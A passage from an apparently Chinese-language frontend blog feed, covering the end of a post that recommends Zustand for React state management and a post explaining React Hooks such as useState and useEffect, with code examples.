href="#Zustand-X-個人職涯發展" class="headerlink" title="Zustand X 個人職涯發展"></a>Zustand X 個人職涯發展</h2><p>每次換新工作時，理論上都應該學會一次新的解決方案。</p><p>我記得最早使用 Zustand 時，因為專案時間緊迫，但我的老闆給了我很大的自由度，當時也是新專案而且時程有被報告追趕的壓力，於是投資了一隻看起來很可愛的熊當狀態管理的工具。</p><p>當然，我認為要選就要選可愛的?!</p><h2 id="Zustand-對專案的優化"><a href="#Zustand-對專案的優化" class="headerlink" title="Zustand 對專案的優化"></a>Zustand 對專案的優化</h2><p>Zustand 的設計使其易於與其他函式庫（如 React Query）整合，並且提供 middleware，使需求的實現變得簡單。我建議維持 Single Source of Truth 的原則，以避免狀態不一致的問題。</p><p>Zustand 的進階寫法支援狀態持久化和多層的狀態更新，這些特性使開發變得更加方便。</p><p>接下來，熊熊稱霸世界?!</p><h3 id="支援-Redux-Devtool"><a href="#支援-Redux-Devtool" class="headerlink" title="支援 Redux Devtool"></a>支援 Redux Devtool</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; devtools &#125; <span class="keyword">from</span> <span class="string">&#x27;zustand/middleware&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Usage with a plain action store, it will log actions as &quot;setState&quot;</span></span><br><span class="line"><span class="keyword">const</span> usePlainStore = <span class="title function_">create</span>(<span class="title function_">devtools</span>(<span class="function">(<span class="params">set</span>) =&gt;</span> ...))</span><br><span class="line"><span class="comment">// Usage with a redux store, it will log full action types</span></span><br><span class="line"><span class="keyword">const</span> useReduxStore = <span class="title function_">create</span>(<span class="title function_">devtools</span>(<span class="title function_">redux</span>(reducer, initialState)))</span><br></pre></td></tr></table></figure><h3 id="支援狀態持久化到瀏覽器的儲存"><a href="#支援狀態持久化到瀏覽器的儲存" class="headerlink" title="支援狀態持久化到瀏覽器的儲存"></a>支援狀態持久化到瀏覽器的儲存</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; create &#125; <span class="keyword">from</span> <span class="string">&quot;zustand&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; persist, createJSONStorage &#125; <span class="keyword">from</span> <span class="string">&quot;zustand/middleware&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> useFishStore = <span class="title function_">create</span>(</span><br><span class="line">  <span class="title function_">persist</span>(</span><br><span class="line">    <span class="function">(<span class="params">set, get</span>) =&gt;</span> (&#123;</span><br><span class="line">      <span class="attr">fishes</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">addAFish</span>: <span class="function">() =&gt;</span> <span class="title function_">set</span>(&#123; <span class="attr">fishes</span>: <span class="title function_">get</span>().<span class="property">fishes</span> + <span class="number">1</span> &#125;),</span><br><span class="line">    &#125;),</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;food-storage&quot;</span>, <span class="comment">// name of the item in the storage (must be unique)</span></span><br><span class="line">      <span class="attr">storage</span>: <span class="title function_">createJSONStorage</span>(<span class="function">() =&gt;</span> <span class="variable language_">sessionStorage</span>), <span class="comment">// (optional) by default, &#x27;localStorage&#x27; is used</span></span><br><span class="line">    &#125;</span><br><span class="line">  )</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="支援非同步"><a href="#支援非同步" class="headerlink" title="支援非同步"></a>支援非同步</h3><p>Zustand 支援非同步操作，開發者可以在 store 裡面實作 fetch 及 setState() 的邏輯。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> useFishStore = <span class="title function_">create</span>(<span class="function">(<span class="params">set</span>) =&gt;</span> (&#123;</span><br><span class="line">  <span class="attr">fishies</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">fetch</span>: <span class="title function_">async</span> (pond) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(pond);</span><br><span class="line">    <span class="title function_">set</span>(&#123; <span class="attr">fishies</span>: <span class="keyword">await</span> response.<span class="title function_">json</span>() &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><h3 id="支援-immer-進行多層的物件操作"><a href="#支援-immer-進行多層的物件操作" class="headerlink" title="支援 immer 進行多層的物件操作"></a>支援 immer 進行多層的物件操作</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; create &#125; <span class="keyword">from</span> <span class="string">&quot;zustand&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; immer &#125; <span class="keyword">from</span> <span class="string">&quot;zustand/middleware/immer&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> useBeeStore = <span class="title function_">create</span>(</span><br><span class="line">  <span class="title function_">immer</span>(<span class="function">(<span class="params">set</span>) =&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">bees</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">addBees</span>: <span class="function">(<span class="params">by</span>) =&gt;</span></span><br><span class="line">      <span class="title function_">set</span>(<span class="function">(<span class="params">state</span>) =&gt;</span> &#123;</span><br><span class="line">        state.<span class="property">bees</span> += by;</span><br><span class="line">      &#125;),</span><br><span class="line">  &#125;))</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// --------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; produce &#125; <span class="keyword">from</span> <span class="string">&quot;immer&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> useLushStore = <span class="title function_">create</span>(<span class="function">(<span class="params">set</span>) =&gt;</span> (&#123;</span><br><span class="line">  <span class="attr">lush</span>: &#123; <span class="attr">forest</span>: &#123; <span class="attr">contains</span>: &#123; <span class="attr">a</span>: <span class="string">&quot;bear&quot;</span> &#125; &#125; &#125;,</span><br><span class="line">  <span class="attr">clearForest</span>: <span class="function">() =&gt;</span></span><br><span class="line">    <span class="title function_">set</span>(</span><br><span class="line">      <span class="title function_">produce</span>(<span class="function">(<span class="params">state</span>) =&gt;</span> &#123;</span><br><span class="line">        state.<span class="property">lush</span>.<span class="property">forest</span>.<span class="property">contains</span> = <span class="literal">null</span>;</span><br><span class="line">      &#125;)</span><br><span class="line">    ),</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> clearForest = <span class="title function_">useLushStore</span>(<span class="function">(<span class="params">state</span>) =&gt;</span> state.<span class="property">clearForest</span>);</span><br><span class="line"><span class="title function_">clearForest</span>();</span><br></pre></td></tr></table></figure><h3 id="架構面-提供在元件外操作共用的狀態"><a href="#架構面-提供在元件外操作共用的狀態" class="headerlink" title="架構面: 提供在元件外操作共用的狀態"></a>架構面: 提供在元件外操作共用的狀態</h3><p>Zustand 允許開發者在元件外直接操作共用狀態，提高了靈活性。</p><p>底下是官網的範例可以透過已經持久化的 store 本身直接進行 <code>getState()</code> 或是 <code>setState()</code> 的狀態操作。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> useDogStore = <span class="title function_">create</span>(<span class="function">() =&gt;</span> (&#123; <span class="attr">paw</span>: <span class="literal">true</span>, <span class="attr">snout</span>: <span class="literal">true</span>, <span class="attr">fur</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Getting non-reactive fresh state</span></span><br><span class="line"><span class="keyword">const</span> paw = useDogStore.<span class="title function_">getState</span>().<span class="property">paw</span>;</span><br><span class="line"><span class="comment">// Listening to all changes, fires synchronously on every change</span></span><br><span class="line"><span class="keyword">const</span> unsub1 = useDogStore.<span class="title function_">subscribe</span>(<span class="variable language_">console</span>.<span class="property">log</span>);</span><br><span class="line"><span class="comment">// Updating state, will trigger listeners</span></span><br><span class="line">useDogStore.<span class="title function_">setState</span>(&#123; <span class="attr">paw</span>: <span class="literal">false</span> &#125;);</span><br></pre></td></tr></table></figure><p>因為這樣的特性，Zustand 也提供了 vanillajs 的版本，便於在多種使用場景下使用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createStore &#125; <span class="keyword">from</span> <span class="string">&#x27;zustand/vanilla&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="title function_">createStore</span>(<span class="function">(<span class="params">set</span>) =&gt;</span> ...)</span><br><span class="line"><span class="keyword">const</span> &#123; getState, setState, subscribe, getInitialState &#125; = store</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store</span><br></pre></td></tr></table></figure><h2 id="2024-年為什麼推薦使用-Zustand"><a href="#2024-年為什麼推薦使用-Zustand" class="headerlink" title="2024 年為什麼推薦使用 Zustand"></a>2024 年為什麼推薦使用 Zustand</h2><p>在新的狀態管理方案中，Zustand 以其簡潔性和靈活性，讓我在開發中感到滿意，在專案需要協助和交接的過程，大多數時候不太需要多餘的解釋，接手的人不論資淺資深都可以快速的上手，使得團隊協作更加順利，隨著開發技術的演進，選擇合適的狀態管理工具變得至關重要，而 Zustand 無疑是當前最佳的選擇之一。</p>]]></content>
      
      
      <categories>
          
          <category> React.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> React.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>為什麼選擇 React Hooks</title>
      <link href="/2024/08/17/react/react-hooks/"/>
      <url>/2024/08/17/react/react-hooks/</url>
      
        <content type="html"><![CDATA[<h2 id="React-Hooks-介紹"><a href="#React-Hooks-介紹" class="headerlink" title="React Hooks 介紹"></a>React Hooks 介紹</h2><p>React 引用的 Hooks 設計，讓副作用處理和外部功能更輕鬆地進入函式元件，相比於類別元件的寫法，提供了更簡單的解決方案。舉例來說，Redux 的 <code>useSelector</code> 可以取代 <code>connect</code> 和 <code>mapStateToProps</code>。接下來，我們將通過 <code>useState</code> 和 <code>useEffect</code> 兩個 Hooks 的範例，來對比其與類別寫法的不同。</p><h2 id="React-元件的兩種形式"><a href="#React-元件的兩種形式" class="headerlink" title="React 元件的兩種形式"></a>React 元件的兩種形式</h2><p>React 元件有兩種形式：類別（Class）和函式（Function）。這兩種形式在狀態管理上有所不同：</p><ul><li><strong>Class 元件</strong>：通過 <code>this.setState()</code> 來直接設定元件中的狀態。</li><li><strong>Function 元件</strong>：使用 <code>const [state, setState] = useState()</code> 來回傳的 <code>setState()</code> 函數進行狀態更新。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 connect 的寫法</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">mapStateToProps</span> = (<span class="params">state</span>) =&gt; (&#123;</span><br><span class="line">  <span class="attr">counter</span>: state.<span class="property">myState</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">connect</span>(mapStateToProps)(<span class="title class_">App</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 hook 的寫法</span></span><br><span class="line"><span class="keyword">const</span> counter = <span class="title function_">useSelector</span>(<span class="function">(<span class="params">state</span>) =&gt;</span> state.<span class="property">myState</span>);</span><br></pre></td></tr></table></figure><h2 id="useState-的概念與理解"><a href="#useState-的概念與理解" class="headerlink" title="useState 的概念與理解"></a>useState 的概念與理解</h2><p>useState 是一個讓函式元件擁有狀態的 Hook。它的運作方式類似於 JavaScript 的閉包模式，讓你可以在函式中管理狀態，而不是使用類別元件中的 <code>this.state</code>。</p><h3 id="useState-純值與物件比較"><a href="#useState-純值與物件比較" class="headerlink" title="useState 純值與物件比較"></a>useState 純值與物件比較</h3><p>狀態可以是基本型別（Primitive）或物件型別（Object）：</p><ul><li>Primitive type：通過值傳遞（by value）。</li><li>Object type：通過引用傳遞（by reference）。</li></ul><p>在 React 中，使用 <code>useState</code> 時的考量包括：</p><ul><li>Primitive：比較單純，適合新手使用。</li><li>Object：對於多層物件結構，建議將物件進行正規化 <a href="https://www.npmjs.com/package/normalizr">(normalize)</a>以簡化比較和更新。</li></ul><h3 id="useState-Primitive-vs-useState-Object"><a href="#useState-Primitive-vs-useState-Object" class="headerlink" title="useState(Primitive) vs useState(Object)"></a>useState(Primitive) vs useState(Object)</h3><p>在使用 Hook 時，可以採用以下兩種策略來處理複雜狀態：</p><ul><li>useState(Primitive)：宣告多個 useState，每個狀態變數單獨管理。</li><li>useState(Object)：使用一個 useState，將多個狀態存儲在一個物件中。</li></ul><p>由於 class 的狀態一定是物件的型態，對於 Object 型態的狀態會有比較好的處理，舉例來說像是物件的合併機制。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class setState 實際上做的事情</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123; ...state, <span class="attr">value</span>: <span class="number">0</span> &#125;);</span><br></pre></td></tr></table></figure><p>相對於 hook 在設定上實際上沒有針對物件做預設的物件合併機制。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  setHookState 其實就是單純設定</span></span><br><span class="line"><span class="keyword">const</span> [state, setHookState] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_">setHookState</span>();</span><br></pre></td></tr></table></figure><h3 id="JavaScript-物件比較"><a href="#JavaScript-物件比較" class="headerlink" title="JavaScript 物件比較"></a>JavaScript 物件比較</h3><p>由於物件型態是 by reference ，使用上會有需要考量相等的比較方式。</p><ul><li>這個例子來說物件並不相等 <code>&#123;display: &quot;flex&quot;&#125; === &#123;display: &quot;flex&quot;&#125; // false</code></li></ul><p>在 JavaScrpit 中有三種比較方式</p><ul><li>strict equality operator &#x3D;&#x3D;&#x3D;</li><li>loose equality operator &#x3D;&#x3D;</li><li>Object.is()</li></ul><p>在 React 中會用到的方式是 shallow object equality check</p><ul><li>Shallow Equality: 會迭代物件物件中的 keys 如果都是 <code>===</code> 就當他相同<ul><li>React.PureComponent 的 shouldComponentUpdate 實作的<a href="https://reactjs.org/docs/shallow-compare.html">判斷方式</a></li></ul></li></ul><p>物件型態是按引用比較的，即 <code>&#123;display: &quot;flex&quot;&#125; === &#123;display: &quot;flex&quot;&#125; // false</code>。<br>React 使用淺層比較來判斷物件是否相同。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">shallowEqual</span>(<span class="params">object1, object2</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> keys1 = <span class="title class_">Object</span>.<span class="title function_">keys</span>(object1);</span><br><span class="line">  <span class="keyword">const</span> keys2 = <span class="title class_">Object</span>.<span class="title function_">keys</span>(object2);</span><br><span class="line">  <span class="keyword">if</span> (keys1.<span class="property">length</span> !== keys2.<span class="property">length</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">of</span> keys1) &#123;</span><br><span class="line">    <span class="keyword">if</span> (object1[key] !== object2[key]) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> hero1 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;Batman&quot;</span>,</span><br><span class="line">  <span class="attr">address</span>: &#123;</span><br><span class="line">    <span class="attr">city</span>: <span class="string">&quot;Gotham&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> hero2 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;Batman&quot;</span>,</span><br><span class="line">  <span class="attr">address</span>: &#123;</span><br><span class="line">    <span class="attr">city</span>: <span class="string">&quot;Gotham&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 兩層</span></span><br><span class="line"><span class="title function_">shallowEqual</span>(hero1, hero2); <span class="comment">// =&gt; false</span></span><br></pre></td></tr></table></figure><h3 id="Module-Pattern-與-useState-的比較"><a href="#Module-Pattern-與-useState-的比較" class="headerlink" title="Module Pattern 與 useState 的比較"></a>Module Pattern 與 useState 的比較</h3><p>Module Pattern 使用 IIFE（Immediately Invoked Function Expression）來創建私有變數和公共函式，類似於 useState 提供的狀態管理方式。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> moduleCounter = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">getValue</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> count;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">increment</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> ++count;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">reset</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;reset:&quot;</span> + count);</span><br><span class="line">      count = <span class="number">0</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>這與 useState 類似，都是利用閉包來保存狀態和操作函式。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Counter</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">increment</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">setCount</span>(count + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">reset</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">setCount</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getValue</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;increment&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        add</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;reset&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        reset</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;getValue()&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="useEffect-的概念與理解"><a href="#useEffect-的概念與理解" class="headerlink" title="useEffect 的概念與理解"></a>useEffect 的概念與理解</h2><p><code>useEffect</code> 用來處理副作用，相當於類別元件中的 <code>componentDidMount</code>、<code>componentDidUpdate</code> 和 <code>componentWillUnmount</code>。它接受兩個參數：副作用函式和依賴陣列。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// componentDidMount</span></span><br><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;&#125;, []);</span><br><span class="line"></span><br><span class="line"><span class="comment">// componentDidUpdate</span></span><br><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> subscription = props.<span class="property">source</span>.<span class="title function_">subscribe</span>();</span><br><span class="line">&#125;, [props.<span class="property">source</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> subscription = props.<span class="property">source</span>.<span class="title function_">subscribe</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// componentWillUnMount</span></span><br><span class="line">    subscription.<span class="title function_">unsubscribe</span>();</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;, [props.<span class="property">source</span>]);</span><br></pre></td></tr></table></figure><h3 id="使用-useEffect-的實際案例"><a href="#使用-useEffect-的實際案例" class="headerlink" title="使用 useEffect 的實際案例"></a>使用 useEffect 的實際案例</h3><p>例如，從 API 取得資料：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">componentDidMount</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">`https://jsonplaceholder.typicode.com/users`</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123; <span class="attr">users</span>: response.<span class="property">data</span> &#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="title function_">componentDidUpdate</span>(<span class="params">prevProps</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (prevProps.<span class="property">resource</span> !== <span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">resource</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">`https://jsonplaceholder.typicode.com/users`</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123; <span class="attr">users</span>: response.<span class="property">data</span> &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">fetchUsers</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">`https://jsonplaceholder.typicode.com/users`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">setUsers</span>(response.<span class="property">data</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">useEffect</span>( <span class="function">() =&gt;</span> &#123; <span class="title function_">fetchUsers</span>(users) &#125;, [ users ] );</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由於 React 是 component-based 的一個函式庫，所以元件本身的<a href="https://linyencheng.github.io/2017/05/18/thinking-component-state-and-props/">定義和規範</a>就蠻重要的，其中比較特殊的是元件在實際運用上會有一些生命週期，大致上我們平常會使用到的就是 <code>componentDidMount</code> 及 <code>componentDidUpdate</code>，剩下可能會用到但比較少的是 <code>componentWillUnmount</code>。</p><p>由於是寫在 function 中，所以可以想像整個 function 的內容都是原來寫法中 <code>render()</code> 裡的內容，差別在把 <code>constructor</code> 中的狀態用其他的方法寫在這個 function 裡面，元件原本由狀態改變來驅動的特性一樣沒有改變。</p><p>更好的寫法則是再抽出來，就會變下面這樣，更清楚也更好測試，也可以重複的去使用相關邏輯。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">useCounter</span>(<span class="params">initial</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(initial);</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">increment</span> = (<span class="params"></span>) =&gt; <span class="title function_">setCount</span>(count + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">reset</span> = (<span class="params"></span>) =&gt; <span class="title function_">setCount</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> &#123; reset, count, increment 